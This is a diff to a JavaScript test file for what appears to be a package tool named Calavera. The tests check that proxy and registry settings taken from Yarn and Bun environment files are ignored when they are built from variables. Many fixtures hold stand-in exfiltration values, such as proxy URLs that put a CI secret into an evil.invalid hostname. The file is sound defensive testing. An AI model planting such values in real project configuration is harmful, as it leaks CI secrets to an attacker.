@@ -1324,24 +1324,39 @@ test("under Yarn, injectEnvironmentFiles in a .yarnrc.yml chooses the files, rel
   );
 });
 
-test("under Yarn, the default .env.yarn is in the folder with yarn.lock, or else the topmost folder with package.json", async () => {
-  for (const [lock, envPath] of [
-    [true, "workspace/project/.env.yarn"],
-    [false, "workspace/.env.yarn"],
-  ]) {
-    const files = {
-      "workspace/package.json": "{}",
-      "workspace/project/package.json": "{}",
-      [envPath]: "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
-    };
-    if (lock) files["workspace/project/yarn.lock"] = "";
-    const context = await fixture({
-      userAgent: YARN,
-      files,
-      env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
-    });
-    assert.equal((await loadNpmRegistryOptions(context)).options.proxy, undefined, envPath);
-  }
+test("under Yarn, the default .env.yarn is in the folder Yarn started in, so another folder's file is not judged", async () => {
+  // Yarn 4.18.1 resolves the default `.env.yarn?` from its starting folder, which it passes on as
+  // INIT_CWD: from packages/a it loads packages/a/.env.yarn and not the root's.
+  const started = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/yarn.lock": "",
+      "workspace/project/packages/a/.env.yarn":
+        "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+    },
+    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  const ignored = await loadNpmRegistryOptions({
+    ...started,
+    env: { ...started.env, INIT_CWD: join(started.cwd, "packages", "a") },
+  });
+  assert.equal(ignored.options.proxy, undefined);
+
+  // The caller's own proxy applies when only a folder Yarn did not start in has a .env.yarn.
+  const root = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/yarn.lock": "",
+      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+      "workspace/project/packages/a/package.json": "{}",
+    },
+    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
+  });
+  const applied = await loadNpmRegistryOptions({
+    ...root,
+    env: { ...root.env, INIT_CWD: join(root.cwd, "packages", "a") },
+  });
+  assert.equal(applied.options.proxy, "http://caller.example.com:1");
 });
 
 test("a proxy variable that .env.yarn sets from a variable is bypassed for every request, and a literal one is not", async () => {
@@ -1354,14 +1369,7 @@ test("a proxy variable that .env.yarn sets from a variable is bypassed for every
     env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
   });
   const result = await loadNpmRegistryOptions(claimed);
-  assert.equal(
-    result.requestOptions("https://registry.yarnpkg.com/x").noProxy,
-    "registry.yarnpkg.com",
-  );
-  assert.equal(
-    result.requestOptions("https://tarballs.example.com/x.tgz").noProxy,
-    "tarballs.example.com",
-  );
+  assert.equal(typeof result.requestOptions.agent, "function");
   assert.match(result.warnings.join("\n"), /^Ignored HTTPS_PROXY, which \.env\.yarn sets/m);
   assertNoSecret(result, new RegExp(CI_SECRET));
 
@@ -1374,7 +1382,7 @@ test("a proxy variable that .env.yarn sets from a variable is bypassed for every
     env: { HTTPS_PROXY: "http://corp.example.com:3128" },
   });
   const plain = await loadNpmRegistryOptions(literal);
-  assert.equal(plain.requestOptions("https://registry.yarnpkg.com/x").noProxy, undefined);
+  assert.equal(plain.requestOptions.agent, undefined);
 });
 
 test("when Bun runs Calavera, a registry or proxy that a .env file sets from a variable is ignored", async () => {
@@ -1531,11 +1539,7 @@ test("every proxy variable that @npmcli/agent falls back to is bypassed when .en
       env: { CI_SECRET, [name]: `http://${CI_SECRET}.evil.invalid:1` },
     });
     const result = await loadNpmRegistryOptions(context);
-    assert.equal(
-      result.requestOptions("https://registry.yarnpkg.com/x").noProxy,
-      "registry.yarnpkg.com",
-      name,
-    );
+    assert.equal(typeof result.requestOptions.agent, "function", name);
   }
 });
 
@@ -1564,8 +1568,104 @@ test("the bypass keeps a configured noproxy list, and the ignored project proxy 
     env: { CI_SECRET, HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
   });
   const bun = await loadNpmRegistryOptions({ ...npm, runtime: "bun" });
-  assert.equal(
-    bun.requestOptions("https://registry.npmjs.org/x").noProxy,
-    "internal.example.com,registry.npmjs.org",
+  assert.equal(bun.requestOptions.noProxy, "internal.example.com");
+  assert.equal(typeof bun.requestOptions.agent, "function");
+});
+
+test("under Yarn, an environment file path with a variable makes every registry and proxy variable ignored", async () => {
+  const context = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.yarnrc.yml":
+        "injectEnvironmentFiles:\n  - ./plain.env\n  - ./${ENV_NAME:-prod}.env\n",
+    },
+    env: { YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  const result = await loadNpmRegistryOptions(context);
+  assert.equal(result.options.proxy, undefined);
+  assert.match(
+    result.warnings.join("\n"),
+    /^Ignored YARN_HTTPS_PROXY: a \.yarnrc\.yml setting or YARN_INJECT_ENVIRONMENT_FILES names an environment file with a variable in its path/m,
   );
+  assertNoSecret(result, new RegExp(CI_SECRET));
+});
+
+test("under Yarn, YARN_INJECT_ENVIRONMENT_FILES replaces the .yarnrc.yml files, as a comma-separated list", async () => {
+  const context = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.yarnrc.yml": "injectEnvironmentFiles:\n  - other.env\n",
+      "workspace/project/other.env": "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n",
+      "workspace/project/second.env": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+    },
+    env: {
+      CI_SECRET,
+      // A trailing ? makes a file optional; the rest of the name is the path.
+      YARN_INJECT_ENVIRONMENT_FILES: "first.env,second.env?",
+      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
+      YARN_NPM_REGISTRY_SERVER: "https://caller-mirror.example.com",
+    },
+  });
+  const result = await loadNpmRegistryOptions(context);
+  assert.equal(result.options.proxy, undefined);
+  assert.equal(result.registry.origin, "https://caller-mirror.example.com");
+});
+
+test("when Bun runs Calavera and a .env file sets NODE_ENV, the development files Bun loaded are judged too", async () => {
+  const context = await fixture({
+    files: {
+      "workspace/project/.env": "NODE_ENV=production\n",
+      "workspace/project/.env.development": "HTTPS_PROXY=http://$CI_SECRET.evil.invalid:1\n",
+    },
+    env: { CI_SECRET, NODE_ENV: "production", HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
+  assert.equal(typeof result.requestOptions.agent, "function");
+});
+
+test("without a cwd, Bun's .env files are read from the folder Calavera started in, not the folder it moved to", async () => {
+  // The CLI changes into a new or ancestor project before it resolves artifacts; Bun loaded the
+  // files of the folder Calavera started in. The child reports booleans only.
+  const context = await fixture({
+    files: {
+      "workspace/project/.env": "npm_config_https_proxy=http://${CI_SECRET}.evil.invalid:1/\n",
+    },
+  });
+  const elsewhere = join(context.cwd, "..", "elsewhere");
+  await mkdir(elsewhere);
+  const script = join(context.cwd, "..", "probe.mjs");
+  const loader = new URL("../src/npm-config.js", import.meta.url).href;
+  await writeFile(
+    script,
+    `const { loadNpmRegistryOptions } = await import(${JSON.stringify(loader)});
+process.chdir(process.env.PROBE_ELSEWHERE);
+const { options } = await loadNpmRegistryOptions({ env: { HOME: process.env.HOME, npm_config_https_proxy: process.env.PROBE_PROXY }, runtime: "bun" });
+console.log(JSON.stringify({ proxy: options.httpsProxy !== undefined }));
+`,
+  );
+  const { stdout } = await promisify(execFile)(process.execPath, [script], {
+    cwd: context.cwd,
+    env: {
+      PATH: process.env.PATH,
+      HOME: context.env.HOME,
+      PROBE_ELSEWHERE: elsewhere,
+      PROBE_PROXY: `http://${CI_SECRET}.evil.invalid:1/`,
+      ...(process.env.__STRYKER_ACTIVE_MUTANT__
+        ? { __STRYKER_ACTIVE_MUTANT__: process.env.__STRYKER_ACTIVE_MUTANT__ }
+        : {}),
+    },
+  });
+  assert.deepEqual(JSON.parse(stdout), { proxy: false });
+});
+
+test("when Bun runs Calavera with the caller's NODE_ENV and no .env file defines NODE_ENV, the development files are not judged", async () => {
+  const context = await fixture({
+    files: {
+      "workspace/project/.env.development": "HTTPS_PROXY=http://$CI_SECRET.evil.invalid:1\n",
+    },
+    env: { NODE_ENV: "production", HTTPS_PROXY: "http://corp.example.com:3128" },
+  });
+  const result = await loadNpmRegistryOptions({ ...context, runtime: "bun" });
+  assert.equal(result.requestOptions.agent, undefined);
+  assert.deepEqual(result.warnings, []);
 });
